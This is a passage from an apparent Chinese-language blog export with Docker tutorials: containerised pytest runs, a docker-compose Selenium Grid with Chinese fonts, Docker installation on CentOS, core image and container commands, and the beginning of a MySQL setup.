<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos data]# docker images</span><br><span class="line">REPOSITORY              TAG       IMAGE ID       CREATED          SIZE</span><br><span class="line">test_py                 v1        1473b91e578e   25 seconds ago   1.05GB</span><br><span class="line">rackspacedot/python37   latest    4513b6d75e1c   4 weeks ago      1.03GB</span><br><span class="line">mysql                   5.7       c20987f18b13   3 months ago     448MB</span><br><span class="line">hello-world             latest    feb5d9fea6a5   5 months ago     13.3kB</span><br></pre></td></tr></table></figure>

<ul>
<li>开启测试：<code>docker run -it --rm -v /usr/local/docker-demo/data:/python test_py:v1 test.py -s</code></li>
<li><code>-it</code> ：以交互模式运行容器</li>
<li><code>-v</code>：挂载目录<code>/usr/local/docker-demo/data</code>到 容器内<code>python</code>文件夹</li>
<li><code>--rm</code>：容器退出时，自动清除容器</li>
<li><code>test_py:v</code>1：镜像:标签</li>
<li><code>test.py</code> 就是源代码文件，因为<code>-v</code>挂载到了本地，使用<code>pytest</code>就能执行到本地源代码</li>
<li><code>-s</code>：pytest 详细信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos data]# docker run -it --rm -v /usr/local/docker-demo/data:/python test_py:v1 test.py -s</span><br><span class="line"></span><br><span class="line">====================================================== short test summary info ======================================================</span><br><span class="line">FAILED test.py::test_request - assert 200 == 201</span><br><span class="line">============================================== 1 failed, 3 passed, 4 warnings in 0.12s ==========</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker之docker-compose安装selenium</title>
    <url>/aposts/c43e961e/</url>
    <content><![CDATA[<ul>
<li>在服务器上安装<code>docker-compose</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure>

<ul>
<li>把本地<code>windows10</code>中的中文字体(<code>C:\Windows\Fonts</code>)随便选择几种拷贝到服务器的路径（<code>/usr/local/selenium_grid/fonts</code>）</li>
</ul>
<p><img src="/aposts/c43e961e/image-20220324193321079.png" alt="image-20220324193321079"></p>
<ul>
<li>查看字体</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/selenium_grid/fonts</span><br><span class="line">[root@VM-24-13-centos fonts]# ll</span><br><span class="line">总用量 65268</span><br><span class="line">-rw-r--r-- 1 root root 16829116 3月  24 18:15 msyhbd.ttc</span><br><span class="line">-rw-r--r-- 1 root root 12139380 3月  24 18:15 msyhl.ttc</span><br><span class="line">-rw-r--r-- 1 root root 19647736 3月  24 18:14 msyh.ttc</span><br><span class="line">-rw-r--r-- 1 root root 18214472 3月  24 18:15 simsun.ttc</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>编写<code>compose.yml</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chrome: </span><br><span class="line">  image: selenium/node-chrome:3.8.1</span><br><span class="line">  links:</span><br><span class="line">    - hub:hub # 这里是把挂载到hub下面的意思</span><br><span class="line">  ports: </span><br><span class="line">    - &quot;5902:5900&quot; # 给vnc调试用</span><br><span class="line">  environment: </span><br><span class="line">    - NODE_MAX_INSTANCES=5 # 实例化和下面参数一般保持一致，可以多机并行</span><br><span class="line">    - NODE_MAX_SESSION=5</span><br><span class="line">    - SCREEN_WIDTH=1920 </span><br><span class="line">    - SCREEN_HEIGHT=1080 </span><br><span class="line">  volumes:</span><br><span class="line">    - /dev/shm:/dev/shm # 挂载这个持久化数据，据说是为了防止不同的闪退</span><br><span class="line">    - ./fonts:/usr/share/fonts # 把中文字体挂载进来，解决截图乱码问题</span><br><span class="line"></span><br><span class="line">hub: </span><br><span class="line">  image: selenium/hub:3.8.1</span><br><span class="line">  ports: </span><br><span class="line">    - &quot;7777:4444&quot; # 7777为外部web访问端口</span><br></pre></td></tr></table></figure>

<ul>
<li>执行compose，<code>-d</code>表示后台执行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<ul>
<li>查看下镜像和容器</li>
</ul>
<p><img src="/aposts/c43e961e/image-20220323192225606.png" alt="image-20220323192225606"></p>
<p><img src="/aposts/c43e961e/image-20220323192256161.png" alt="image-20220323192256161"></p>
<ul>
<li>远程查看下，输入：<code>http://ip:7777/grid/console/?config=true&amp;configDebug=true</code></li>
</ul>
<p><img src="/aposts/c43e961e/image-20220323192506464.png" alt="image-20220323192506464"></p>
<ul>
<li>编写测试代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> pip3 install selenium</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.desired_capabilities import DesiredCapabilities</span><br><span class="line">from multiprocessing import Process</span><br><span class="line"></span><br><span class="line">print(11111)</span><br><span class="line"># ip = &quot;远程ip&quot;</span><br><span class="line">ip = &quot;localhost&quot;</span><br><span class="line">driver = webdriver.Remote(</span><br><span class="line">    command_executor=&quot;http://%s:7777/wd/hub&quot; %ip,</span><br><span class="line">    desired_capabilities=DesiredCapabilities.CHROME</span><br><span class="line">)</span><br><span class="line">print(22222)</span><br><span class="line"></span><br><span class="line">def test(i):</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    driver.get(&quot;https://www.baidu.com&quot;)</span><br><span class="line">    print(driver.title, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    test(1)</span><br><span class="line">    driver.close()</span><br><span class="line">    driver.quit()</span><br></pre></td></tr></table></figure>

<ul>
<li>无论是本地还是服务器运行测试代码已经通过</li>
</ul>
<p><img src="/aposts/c43e961e/image-20220323192620673.png" alt="image-20220323192620673"></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>自动化测试</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker安装</title>
    <url>/aposts/327177db/</url>
    <content><![CDATA[<h2 id="什么是docker"><a href="#什么是docker" class="headerlink" title="什么是docker"></a>什么是docker</h2><ul>
<li><p><a href="https://juejin.cn/post/6844903918372143112">这篇文章</a>对docker进行了比较详细的介绍，我抄录一些笔记</p>
</li>
<li><p><code>Docker</code>是容器技术的一种实现，也是操作系统层面的一种虚拟化，与虚拟机通过一套硬件再安装操作系统完全不同。</p>
</li>
</ul>
<p><img src="/aposts/327177db/image-20220317105407328.png" alt="image-20220317105407328"></p>
<ul>
<li><code>Docker</code> 和虚拟机并不一样，<code>Docker</code>是在操作系统进程层面的隔离，而虚拟机是在物理资源层面的隔离，两者完全不同，另外，我们也可以通过下面的一个比较，了解两者的根本性差异。</li>
</ul>
<p><img src="/aposts/327177db/image-20220317105131805.png" alt="image-20220317105131805"></p>
<h2 id="Docker的版本"><a href="#Docker的版本" class="headerlink" title="Docker的版本"></a>Docker的版本</h2><ul>
<li><p><code>Docker</code>分为社区版(<code>CE</code>)和企业版(<code>EE</code>)两个版本，社区版本可以免费使用，而企业版则需要付费使用，对于我们个人开发者或小企业来说，一般是使用社区版的。</p>
</li>
<li><p><code>Docker CE</code>有三个更新频道，分别为<code>stable</code>、<code>test</code>、<code>nightly</code>，<code>stable</code>是稳定版本，<code>test</code>是测试后的预发布版本，而<code>nightly</code>则是开发中准备在下一个版本正式发布的版本，我们可以根据自己的需求下载安装。</p>
</li>
</ul>
<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><ul>
<li>我自己购买的是某云的服务器，系统是centos7 64如下，docker官方说至少3.8以上，建议3.10以上</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# uname -a</span><br><span class="line">Linux VM-24-13-centos 3.10.0-1160.11.1.el7.x86_64 #1 SMP Fri Dec 18 16:34:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>更新yum包,需要时间可能会比较久，慢慢等就行了，生产环境慎重操作</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure>

<ul>
<li>修改yun-config的python版本为2</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /usr/bin/yum-config-manager</span><br><span class="line"></span><br><span class="line">#!/usr/bin/python2 -tt</span><br></pre></td></tr></table></figure>

<ul>
<li>设置yum的源</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>安装docker</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install docker-ce</span><br></pre></td></tr></table></figure>

<ul>
<li>启动docker服务，后台运行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure>

<ul>
<li>更换国内源</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;http://hub-mirror.c.163.com&quot;,</span><br><span class="line">    &quot;https://docker.mirrors.ustc.edu.cn&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>重启</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<ul>
<li>查看是否设置成功</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker info</span><br><span class="line"></span><br><span class="line"> Labels:</span><br><span class="line"> Experimental: false</span><br><span class="line"> Insecure Registries:</span><br><span class="line">  127.0.0.0/8</span><br><span class="line"> Registry Mirrors:</span><br><span class="line">  https://registry.docker-cn.com/</span><br><span class="line">  http://hub-mirror.c.163.com/</span><br><span class="line">  https://docker.mirrors.ustc.edu.cn/</span><br><span class="line"> Live Restore Enabled: false</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>查看版本信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           20.10.13</span><br><span class="line"> API version:       1.41</span><br><span class="line"> Go version:        go1.16.15</span><br><span class="line"> Git commit:        a224086</span><br><span class="line"> Built:             Thu Mar 10 14:09:51 2022</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Context:           default</span><br><span class="line"> Experimental:      true</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>卸载</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line"></span><br><span class="line">docker-client \</span><br><span class="line"></span><br><span class="line">docker-client-latest \</span><br><span class="line"></span><br><span class="line">docker-common \</span><br><span class="line"></span><br><span class="line">docker-latest \</span><br><span class="line"></span><br><span class="line">docker-latest-logrotate \</span><br><span class="line"></span><br><span class="line">docker-logrotate \</span><br><span class="line"></span><br><span class="line">docker-selinux \</span><br><span class="line"></span><br><span class="line">docker-engine-selinux \</span><br><span class="line"></span><br><span class="line">docker-engine</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo rm -rf /var/lib/docke</span><br></pre></td></tr></table></figure>

<h2 id="三大组件"><a href="#三大组件" class="headerlink" title="三大组件"></a>三大组件</h2><p><code>镜像(Image)</code>，<code>容器(Container)</code>，<code>仓库(Repository)</code>是我们常说的<code>Docker</code>的三大组件，来自对<a href="https://juejin.cn/post/6844903938030845966">此文章</a>的抄录</p>
<h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><p>简单地理解，<code>Docker镜像</code>就是一个<code>Linux</code>的文件系统(<code>Root FileSystem</code>)，这个文件系统里面包含可以运行在<code>Linux内核</code>的程序以及相应的数据。</p>
<p><strong>谈到这里，我们可能需要先补充一点与<code>Linux</code>操作系统相关的知识：</strong></p>
<blockquote>
<p>一般而言， <code>Linux</code>分为两个部分：<code>Linux内核(Linux Kernel)</code>与<code>用户空间</code>，而真正的<code>Linux操作系统</code>，是指<code>Linux内核</code>，我们常用的<code>Ubuntu</code>,<code>Centos</code>等操作系统其实是不同厂商在<code>Linux内核</code>基础上添加自己的软件与工具集(<code>tools</code>)形成的发布版本(<code>Linux Distribution</code>)。</p>
</blockquote>
<p>因此，我们也可以把镜像看成是上面所说的<code>用户空间</code>，当<code>Docker</code>通过镜像创建一个容器时，就是将镜像定义好的<code>用户空间</code>作为独立隔离的进程运行在宿主机的<code>Linux内核</code>之上。</p>
<h4 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker search hello-word</span><br><span class="line">NAME                                    DESCRIPTION                   STARS     OFFICIAL   AUTOMATED</span><br><span class="line">chenlicn163/hello-word                  hello-word                    0     </span><br><span class="line">...........</span><br></pre></td></tr></table></figure>

<h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><ul>
<li>拉取镜像可以使用<code>docker image pull</code>，其格式如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker image pull [OPTIONS] NAME[:TAG|@DIGEST]</span><br></pre></td></tr></table></figure>

<ul>
<li><p>要拉取镜像，需要指定<code>Docker Registry</code>的URL和端口号，默认是<code>Docker Hub</code>，另外还需要指定<code>仓库名</code>和标签，仓库名和标签唯一确定一个镜像，而标签是可能省略，如果省略，则默认使用<code>latest</code>作为标签名，而仓库名则由作者名和软件名组成。</p>
</li>
<li><p>比如下面就算拉取hello-word的镜像，整个命令的意思就是：在Docker Hub中拉取最新(last)版本的镜像文件</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker pull hello-world</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">2db29710123e: Pull complete</span><br><span class="line">Digest: sha256:4c5f3db4f8a54eb1e017c385f683a2de6e06f75be442dc32698c9bbe6c861edd</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line">docker.io/library/hello-world:latest</span><br></pre></td></tr></table></figure>

<ul>
<li>查看镜像 <code>docker images</code>和<code>docker image ls</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker image ls</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">hello-world   latest    feb5d9fea6a5   5 months ago   13.3kB</span><br></pre></td></tr></table></figure>

<h4 id="导出和导入镜像"><a href="#导出和导入镜像" class="headerlink" title="导出和导入镜像"></a>导出和导入镜像</h4><ul>
<li>如果想与别人共享某个镜像，除了从镜像服务仓库中<code>pull</code>镜像和把镜像<code>push</code>到仓库上去之外，其实我们还可以将本地构建好的镜像直接导出并保存为文件发送给别人，如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker image save -o /tmp/test_image.tar.gz hello-world:latest</span><br></pre></td></tr></table></figure>

<ul>
<li>查看导出的镜像</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# ll /tmp/ | grep image</span><br><span class="line">-rw------- 1 root root  24064 Mar 17 15:11 test_image.tar.gz</span><br></pre></td></tr></table></figure>

<ul>
<li>而当你拿到别人导出的镜像文件，你可以使用<code>docker load</code>命令把镜像加载到本地的<code>Docker</code>镜像列表中，如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker load &lt; /tmp/test_image.tar.gz</span><br></pre></td></tr></table></figure>

<h4 id="删除本地镜像"><a href="#删除本地镜像" class="headerlink" title="删除本地镜像"></a>删除本地镜像</h4><ul>
<li>常用格式如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi  [option]  IMAGE1,IMAGE2,...IMAGEn</span><br></pre></td></tr></table></figure>

<ul>
<li>可以使用镜像的长id、镜像短id、镜像摘要以及镜像名称来删除镜像，如下删除刚刚拉取的hello-word镜像</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker rmi feb5d9fea6a5</span><br><span class="line">Untagged: hello-world:latest</span><br><span class="line">Untagged: hello-world@sha256:4c5f3db4f8a54eb1e017c385f683a2de6e06f75be442dc32698c9bbe6c861edd</span><br><span class="line">Deleted: sha256:feb5d9fea6a5e9606aa995e879d862b825965ba48de054caab5ef356dc6b3412</span><br><span class="line">Deleted: sha256:e07ee1baac5fae6a26f30cabfe54a36d3402f96afda318fe0a96cec4ca393359</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>当然我们想要清除本地全部镜像时，可以使用下面的命令，不过一般不建议使用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker rmi $(docker images -qa)</span><br></pre></td></tr></table></figure>

<ul>
<li>另外，一般如果镜像已经被使用来创建容器，使用上面的命令删除会报下面的错误，告诉我们该镜像已经被使用，不允许删除。对于已经被用于创建容器的镜像，删除方法有两种，<strong>一种是先把容器删除，再删除镜像</strong>，另一种则只需要在删除镜像的命令中跟一个<code>-f</code>参数便可，如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker rim -f f7302</span><br></pre></td></tr></table></figure>

<h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><p>面的例子都是直接使用官方提供的镜像，其实，除了从官方仓库或其他镜像仓库拉取别人构建好的镜像外，我们也可以构建自己的镜像，本次跳过</p>
<h3 id="容器-Container"><a href="#容器-Container" class="headerlink" title="容器(Container)"></a>容器(Container)</h3><ul>
<li><p>容器与镜像的关系，就如同面向编程中对象与类之间的关系。<strong>因为容器是通过镜像来创建的，所以必须先有镜像才能创建容器</strong>，而生成的容器是一个独立于宿主机的隔离进程，并且有属于容器自己的网络和命名空间。</p>
</li>
<li><p><strong>镜像是只读的，但容器却是可读可写的</strong></p>
</li>
</ul>
<h4 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h4><p>有两种，分别为<code>docker run</code>和<code>docker start</code></p>
<h5 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h5><ul>
<li>使用docker run命令通过镜像创建一个全新的容器<ul>
<li>如果镜像（hello-world）本地不存在，会提前去下载，然后再次运行</li>
<li>运行后会退出，通过<code>docker ps</code> 查看不到，要加个<code>-a</code>，<code>docker ps -a</code></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>

<ul>
<li>如容器是一种提供服务的守护进程，那么通常需要开放端口供外部访问，则容器会一直处于运行状态，如</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -p 81:80 nginx</span><br><span class="line"># -p 81:80 将容器内部端口80映射到端口81</span><br></pre></td></tr></table></figure>

<ul>
<li>可以为容器指定一个名称，如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker run -p 80:80 --name mynginx nginx</span><br><span class="line"># --name 后面的myngin就是自定义的容器名字</span><br></pre></td></tr></table></figure>

<ul>
<li>也可以进入到容器中，直接与容器进行交互</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker run -it centos /bin/bash</span><br><span class="line"># -i 表示允许你对容器内的标准输入 (STDIN) 进行交互。</span><br><span class="line"># -t 在新容器内指定一个伪终端或终端</span><br><span class="line"># /bin/bash表示运行容器后要执行的命令</span><br></pre></td></tr></table></figure>

<h5 id="docker-start"><a href="#docker-start" class="headerlink" title="docker start"></a>docker start</h5><p>另外一种则是使用<code>docker start</code>命令重新启动已经停止运行的容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># container_id表示容器的id</span><br><span class="line">$ docker start container_id</span><br></pre></td></tr></table></figure>

<h4 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h4><ul>
<li><p><code>Docker</code>容器运行起来以后，要想进入容器内部可以先通过<code>docker ps</code>命令查看，当前运行的容器信息</p>
</li>
<li><p>再通过 <code>docker exec -it ec3d30bff042</code> 命令，其中<code>ec3d30bff042</code>为容器ID <code>docker exec -it ec3d30bff042 /bin/bash</code></p>
</li>
</ul>
<h4 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h4><p>而对于正在运行的容器，也可以通过<code>docker restart</code>命令重新启动，如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker restart container_id</span><br></pre></td></tr></table></figure>

<h4 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h4><ul>
<li>查看在运行的容器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<ul>
<li>查看所有容器包括在运行中的和停止的容器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<ul>
<li><p>比如运行<code>hellword</code>，为什么输入 <code>docker ps </code>不显示出来呢？输入<code>docker ps -a</code> 就显示出来？这里说明一下，这个 <code>hellword</code> 是<code>run</code>一下子它就结束程序了你还想它后台运行啥？如果你还是让它运行，那倒是也可以，写一个死循环就可以咯！</p>
</li>
<li><p>有时候，我们只想查到容器的id,可以用下面的命令：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -aq</span><br></pre></td></tr></table></figure>

<h4 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h4><ul>
<li>对于已经不需要的容器，可以使用<code>docker stop</code>命令停止其运行，如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker stop container_id1，container_id2...</span><br></pre></td></tr></table></figure>

<ul>
<li>批量停止容器，如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker stop $(docker ps -qa)</span><br></pre></td></tr></table></figure>

<h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><ul>
<li>指定容器id进行删除</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># container_id表示容器id，通过docker ps可以看到容器id</span><br><span class="line">$ docker rm container_id</span><br></pre></td></tr></table></figure>

<ul>
<li>当我们需要批量删除所有容器，可以用下面的命令：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 删除所有容器</span><br><span class="line">docker rm $(docker ps -a -q)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>删除所有退出的容器，这样执行后，刚刚执行的helloword容器用<code>docker ps -a</code>就查不到了</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker container prune</span><br></pre></td></tr></table></figure>

<h4 id="导出容器为镜像"><a href="#导出容器为镜像" class="headerlink" title="导出容器为镜像"></a>导出容器为镜像</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker export -o ./image.tar.gz f4f184f5ffb9</span><br></pre></td></tr></table></figure>

<ul>
<li>将容器导出后，我们可以另外一台有安装<code>Docker</code>的电脑中将文件包导入成为镜像，如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker import image.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h3><p>仓库(<code>Repository</code>)是集中存储镜像的地方，这里有个概念要区分一下，那就是仓库与仓库服务器(<code>Registry</code>)是两回事，像我们上面说的<code>Docker Hub</code>，就是<code>Docker</code>官方提供的一个仓库服务器，不过其实有时候我们不太需要太过区分这两个概念。</p>
<h4 id="公共仓库"><a href="#公共仓库" class="headerlink" title="公共仓库"></a>公共仓库</h4><ul>
<li><p>公共仓库一般是指<code>Docker Hub</code>，前面我们已经多次介绍如何从<code>Docker Hub</code>获取镜像，除了获取镜像外，我们也可以将自己构建的镜像存放到<code>Docker Hub</code>，这样，别人也可以使用我们构建的镜像。</p>
</li>
<li><p>不过要将镜像上传到<code>Docker Hub</code>，必须先在<code>Docker</code>的官方网站上注册一个账号，注册好了之后，可以在本地使用命令登录到<code>Dokcer Hub</code>了，过程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker login</span><br></pre></td></tr></table></figure></li>
</ul>
<p>在输入账号密码登录到<code>Docker Hub</code>之后，便可以使用<code>docker push</code>命令把镜像推送到<code>Docker Hub</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker push test:1.0</span><br></pre></td></tr></table></figure>

<h4 id="私有仓库"><a href="#私有仓库" class="headerlink" title="私有仓库"></a>私有仓库</h4><ul>
<li><p>有时候自己部门内部有一些镜像要共享时，如果直接导出镜像拿给别人又比较麻烦，使用像<code>Docker Hub</code>这样的公共仓库又不是很方便，这时候我们可以自己搭建属于自己的私有仓库服务，用于存储和分布我们的镜像。</p>
</li>
<li><p><code>Docker</code>官方提供了<code>registry</code>这个镜像，可以用于搭建私有仓库服务，我们把镜像拉到本地之后，用下面命令创建该镜像的容器便可以搭建一个仓库服务，如下：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker run -d -p 5000:5000 --restart=always --name registry registry</span><br></pre></td></tr></table></figure>

<ul>
<li>假设我们把一台IP为<code>192.168.0.100</code>的服务器作为仓库服务，并运行上面的语句，那么我们可以下面的语句重新构建上面的镜像，如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker build -t &quot;192.168.0.100/hello-go:1.0&quot; .</span><br></pre></td></tr></table></figure>

<ul>
<li>然后使用下面的语句推送到自己的私有仓库服务器：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker push 192.168.0.100/hello-word:1.0</span><br></pre></td></tr></table></figure>

<h2 id="Docker的组成与架构"><a href="#Docker的组成与架构" class="headerlink" title="Docker的组成与架构"></a>Docker的组成与架构</h2><ul>
<li>在安装好并启动了<code>Docker</code>之后，我们可以使用在命令行中使用<code>docker</code>命令操作docker，比如我们使用如下命令打印<code>docker</code>的版本信息。</li>
</ul>
<p><img src="/aposts/327177db/image-20220317165337772.png" alt="image-20220317165337772"></p>
<ul>
<li><p>从上面的图中，我们看到打出了两个部分的信息：<code>Client</code>和<code>Server</code></p>
</li>
<li><p>这是因为<code>Docker</code>跟大部分服务端软件一样(如<code>MySQL</code>)，都是使用<code>C/S</code>的架构模型，也就是通过客户端调用服务器，只是我们现在刚好服务端和客户端都在同一台机器上而已。</p>
</li>
<li><p>因此，我们可以使用下面的图来表示<code>Docker</code>的架构，<code>DOCKER_HOST</code>是<code>Docker server</code>，而Clinet便是我们在命令中使用<code>docker</code>命令。</p>
<p><img src="/aposts/327177db/image-20220317165825026.png" alt="image-20220317165825026"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker实践mysql+python</title>
    <url>/aposts/7ae40889/</url>
    <content><![CDATA[<h2 id="mysql实践"><a href="#mysql实践" class="headerlink" title="mysql实践"></a>mysql实践</h2><ul>
<li>本地环境（云服务器的本地路径）新建文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/mysql/conf ~/mysql/data ~/mysql/logs</span><br><span class="line"># 用来挂载容器中mysql的conf、data、logs目录）</span><br></pre></td></tr></table></figure>

<ul>
<li><code>docker pull</code>镜像 安装 <code>mysql5.7 </code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull mysql:5.7</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">mysql         5.7       c20987f18b13   2 months ago   448MB</span><br><span class="line">hello-world   latest    feb5d9fea6a5   5 months ago   13.3kB</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>启动容器运行镜像</li>
</ul>
